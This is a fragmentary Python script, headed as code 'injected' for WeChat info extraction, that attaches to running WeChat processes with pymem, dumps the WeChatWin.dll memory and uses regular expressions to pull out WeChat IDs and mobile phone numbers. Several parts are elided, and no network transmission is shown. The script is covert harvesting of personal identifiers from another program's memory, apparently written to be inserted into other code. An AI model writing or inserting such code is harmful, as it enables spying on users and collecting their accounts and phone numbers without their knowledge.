...
# === Injected for current WeChat info extraction ===
...
def get_running_wechat_processes():
    processes = []
...
def read_memory_string(pm, address, max_length=100):
    try:
        bytes_data = pm.read_bytes(address, max_length)
        result = bytes_data.split(b'\x00')[0].decode('utf-8', errors='ignore')
        return result if result else None
    except:
        return None

def extract_info_from_memory(proc):
    try:
        pm = pymem.Pymem()
        pm.open_process_from_id(proc.pid)

        modules = list(pm.list_modules())
        wx_module = next((m for m in modules if "WeChatWin.dll" in m.name), None)
        if not wx_module:
            return None

        # 搜索内存中类似手机号或微信号的特征（示例：wxid_、1开头11位数字）
        memory_dump = pm.read_bytes(wx_module.lpBaseOfDll, wx_module.SizeOfImage)
        matches = re.findall(b'wxid_[0-9a-z]{5,}', memory_dump)
        wxids = list(set(m.decode('utf-8') for m in matches))

        phone_matches = re.findall(b'1[3-9]\d{9}', memory_dump)
        phones = list(set(m.decode('utf-8') for m in phone_matches))
...
def get_all_logged_in_wechat_info():
    results = []
    procs = get_running_wechat_processes()
    for proc in procs:
        info = extract_info_from_memory(proc)
        if info:
            results.append(info)
    return results
